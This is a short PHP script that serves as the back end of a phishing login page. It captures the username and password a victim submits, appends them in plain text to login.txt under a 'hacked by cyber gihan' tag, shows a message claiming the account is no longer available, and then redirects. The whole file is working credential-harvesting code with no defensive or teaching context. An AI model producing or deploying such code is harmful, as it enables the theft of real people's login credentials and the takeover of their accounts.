<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    
    
    $file = fopen("login.txt", "a");
    fwrite($file, "ʜᴀᴄᴋɪᴅ ʙʏ ᴄʏʙᴇʀ ɢɪʜᴀɴ | Username: " . $username . "\n");
    fwrite($file, "ʜᴀᴄᴋɪᴅ ʙʏ ᴄʏʙᴇʀ ɢɪʜᴀɴ |Password: " . $password . "\n\n");
    fclose($file );

   echo "
<html>
           
                <style>
                    body { background-color: black; }
                    h1 { color: red; }
                    h2 { color: green; } 
                </style>
            </head>
            <body>
            
                <h1>Your Accout Is No longer Available. . . . . . . .  </h1>
            </body>
        </html>
        <h2> ⃝🎭ﭢᴰᴬᴿᴷＧＩＨＡＮ_<\>. . . . . . . </h2>"
       ;
         
}
?>
   <meta http-equiv="refresh" content="2; url=cybergihan.php">
